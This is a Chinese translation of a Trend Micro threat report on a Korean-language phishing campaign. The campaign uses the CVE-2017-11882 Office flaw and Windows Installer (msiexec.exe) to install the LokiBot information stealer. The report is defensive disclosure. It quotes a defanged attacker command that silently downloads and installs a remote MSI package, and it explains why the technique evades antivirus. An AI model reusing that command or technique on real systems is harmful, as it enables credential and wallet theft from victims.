> 原文链接: https://www.anquanke.com//post/id/98190 


# 借助Windows Installer的msiexec.exe实现LokiBot恶意软件感染


                                阅读量   
                                **146630**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者trend micro，文章来源：blog.trendmicro.com
                                <br>原文地址：[https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/](https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/)

译文仅供参考，具体内容表达以及含义原文为准

## [![](https://p5.ssl.qhimg.com/t012861feaa51ce3d80.png)](https://p5.ssl.qhimg.com/t012861feaa51ce3d80.png)

## 传送门

CVE-2017-11882漏洞利用：投递Loki信息窃取木马的破解版本<br>[https://www.anquanke.com/post/id/91946](https://www.anquanke.com/post/id/91946)



## 前言

早在2017年9月，微软针对影响Microsoft Office的远程代码执行漏洞CVE-2017-11882发布了补丁。然而，该补丁的发布并没有阻止Cobalt等网络犯罪组织利用该漏洞来传播各种恶意软件，其中包括FAREIT、Ursnif和Loki信息窃取恶意软件的破解版本。其中，Loki主要功能是记录键盘输入的密码内容以及窃取加密货币钱包信息。<br>
CVE-2017-11882的微软通告请参考：[https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882) 。<br>
Cobalt组织的信息请参考：[https://blog.trendmicro.com/trendlabs-security-intelligence/cobalt-spam-runs-use-macros-cve-2017-8759-exploit/](https://blog.trendmicro.com/trendlabs-security-intelligence/cobalt-spam-runs-use-macros-cve-2017-8759-exploit/) 。<br>
FAREIT的相关信息请参考：[https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/fareit](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/fareit) 。<br>
Ursnif的相关信息请参考：[http://blog.trendmicro.com/trendlabs-security-intelligence/new-malicious-macro-evasion-tactics-exposed-ursnif-spam-mail/](http://blog.trendmicro.com/trendlabs-security-intelligence/new-malicious-macro-evasion-tactics-exposed-ursnif-spam-mail/) 。<br>
近期，我们发现有攻击者利用CVE-2017-11882这一漏洞，通过Windows操作系统中的Windows Installer服务实现攻击，这是一种此前并没有见到过的新型攻击方式。与此前使用Windows可执行文件mshta.exe利用此漏洞运行PowerShell脚本的恶意软件有所不同，借助于Windows Installer可以下载并执行有效载荷。这种利用方式是使用Windows Installer服务中的msiexec.exe。



## 感染链

[![](https://blog.trendmicro.com/trendlabs-security-intelligence/files/2018/02/msiexec1.png)](https://blog.trendmicro.com/trendlabs-security-intelligence/files/2018/02/msiexec1.png)<br>
根据我们分析的样本，该攻击需要借助于钓鱼邮件的方式。攻击者向目标用户发送一封电子邮件，邮件中要求收件人确认是否已向发件人进行付款。该电子邮件所使用语言为韩文，大致翻译为：“你好，请检查你的电脑是否受到病毒或恶意代码的感染。”该提示显然是为了误导收件人让其以为电脑可能被感染。<br>
该邮件中，还包含一个名称为“Payment copy.doc”（趋势科技将其检测为TROJ_CVE201711882.SM木马病毒）的附件，该文档伪装成付款确认文档，实际上其中包含利用CVE2017-11882漏洞的恶意软件。<br>[![](https://blog.trendmicro.com/trendlabs-security-intelligence/files/2018/02/msiexec2-1.png)](https://blog.trendmicro.com/trendlabs-security-intelligence/files/2018/02/msiexec2-1.png)<br>[![](https://blog.trendmicro.com/trendlabs-security-intelligence/files/2018/02/msiexec3.png)](https://blog.trendmicro.com/trendlabs-security-intelligence/files/2018/02/msiexec3.png)<br>
在感染恶意软件后，会使用以下命令，借助Windows Installer下载并安装名为zus.msi的恶意MSI软件包：<br>
调用cmd.exe /c msiexec /q /I “hxxps[:]//www[.]uwaoma[.]info/zus.msi<br>
msiexec.exe将二进制文件命名为MSIFD83.tmp：<br>[![](https://blog.trendmicro.com/trendlabs-security-intelligence/files/2018/02/msiexec4.png)](https://blog.trendmicro.com/trendlabs-security-intelligence/files/2018/02/msiexec4.png)<br>
安装后的MSIL（微软中间语言）二进制文件：<br>[![](https://blog.trendmicro.com/trendlabs-security-intelligence/files/2018/02/msiexec5.png)](https://blog.trendmicro.com/trendlabs-security-intelligence/files/2018/02/msiexec5.png)<br>
在完成下载之后，Windows Installer（msiexec.exe）会继续将MSIL或Delphi二进制文件安装到系统。根据下载的MSI包，它可能包含严重混淆的MSIL或Delphi二进制文件，该文件是实际有效载荷的加载程序。<br>
其中，一个值得注意的地方是，该包中提供了一个压缩层，文件扫描引擎需要进行处理和遍历，以检测文件是否为恶意文件。尽管这一过程相对简单，但如果要去检测和识别有效载荷就变得比较复杂了，因为有效载荷包含在严重混淆的MSIL和Delphi二进制文件中。<br>
二进制文件会启动另一个随机命名的实例，该实例中会被替换为恶意软件的有效载荷。<br>[![](https://blog.trendmicro.com/trendlabs-security-intelligence/files/2018/02/msiexec6-2.png)](https://blog.trendmicro.com/trendlabs-security-intelligence/files/2018/02/msiexec6-2.png)<br>
至此，我们已经知道，这种技术用于承载我们所检测到的样本LokiBot（TROJ_LOKI.SMA），同时也可以模块化地承载其他有效载荷。



## 使用Windows Installer方式的原因

目前，反病毒软件都会重点监控可能的下载程序，例如Wscript、PowerShell、mshta.exe、winword.exe和其他类似的可执行文件，因为它们已经日渐流行地成为安装恶意有效载荷的方式。由于它们被广泛使用，因此通过监控这些软件来阻止威胁也是非常简单有效的方法。然而，使用msiexec.exe下载恶意MSI软件包却在恶意软件中并不常见。<br>
尽管目前也有其他恶意软件会利用msiexec.exe，例如Andromeda僵尸网络，但它却不同于Loki对msiexec.exe的利用方式。在Andromeda中，会向msiexec.exe进行代码注入，并下载有效载荷和更新。另外一个重要的不同是，当Andromeda下载有效载荷及更新时，它会立即下载并执行一个PE文件。而Loki则使用会被msiexec.exe识别为安装包的MSI包，从而借助Windows Installer感染主机。<br>
其实，恶意软件并不真的必须要通过MSI软件包进行安装。与大多数使用msiexec.exe的恶意软件有所不同，该恶意软件不会修改二进制文件或其进程，而是仅仅使用Windows Installer的可用功能来安装恶意软件。另外，MSI软件包通常会被恶意用于安装可能不需要的应用程序（PUA）而不是恶意软件本身，这很可能会成为恶意软件作者的一个新“潮流”。<br>
那么，为什么要使用这种安装的方式呢？我们认为，可能是恶意软件作者在分析了主流反病毒产品后，找到了一个全新的逃避检测方式。尽管我们尽可能多地分析了恶意软件样本，但我们暂时还无法证明该类恶意软件全都是通过上述方式来进行的。此外，根据所使用的文字语言，我们认为它的目标人群为韩国用户。



## 缓解方式

鉴于钓鱼邮件是其传播的主要途径，因此个人用户或组织可以通过阻止恶意邮件和垃圾邮件，来缓解此攻击产生的影响。<br>
其中，用户应该对邮件的内容进行有效甄别。举例来说，用户如果看到要求确认付款收据的邮件，但最近并没有进行过相关交易，那么就应该立即提起警惕。此外，如果看到不知所云的内容，也应该引起怀疑。同样地，在付款确认邮件中包含用于检查病毒或可疑软件的工具，本身就是非常值得怀疑的一种行为。最后，涉及商业交易的邮件内容都非常正式，如果你发现了拼写错误或语法错误，都可能意味着这封邮件是钓鱼邮件。<br>
另一种更直接的缓解方式就是禁用Windows Installer，以防止潜在攻击者在用户系统上安装软件。或者，也可以在系统设置中，设置为“仅由系统管理员安装程序”。
